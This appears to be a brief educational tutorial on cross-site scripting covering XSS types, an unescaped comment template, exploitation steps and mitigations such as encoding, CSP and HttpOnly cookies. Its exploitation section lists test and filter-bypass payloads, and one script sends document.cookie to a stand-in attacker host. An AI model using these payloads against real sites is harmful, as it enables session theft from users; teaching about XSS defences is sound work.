# Cross-Site Scripting (XSS) Attack Demo

## What is XSS?
XSS allows attackers to inject malicious scripts into webpages viewed by other users. It can steal session tokens, deface sites, or redirect users.

## Types of XSS
- **Stored XSS**: Malicious script is saved on server (e.g., in a database).
- **Reflected XSS**: Script comes from request parameters.
- **DOM-based XSS**: Vulnerability in client-side scripts.

## Example Scenario
A comment field renders user input without sanitization:
```html
<p>Comment: {{ user_comment }}</p>
```
If attacker submits:
```html
<script>alert('XSS');</script>
```
The alert pops up for any visitor.

## Step-by-Step Exploitation
1. **Locate injection points**  
   - Search for input reflected in responses.
2. **Test payloads**  
   - `<script>alert(1)</script>`
3. **Bypass filters**  
   - Use event handlers: `<img src=x onerror=alert(1)>`
   - Use Unicode or mixed-case encoding.
4. **Steal cookies**  
   ```html
   <script>fetch('https://attacker.com/steal?c='+document.cookie)</script>
   ```
5. **Maintain persistence** (Stored XSS)

## Mitigation Strategies
- **Contextual Output Encoding**  
  - HTML encode user input.
- **CSP (Content Security Policy)**  
  ```http
  Content-Security-Policy: default-src 'self';
  ```
- **HTTPOnly Cookies**  
  - Prevent access from JavaScript.
- **Framework Protections**  
  - Use built-in templating auto-escaping (e.g., Handlebars, Django templates).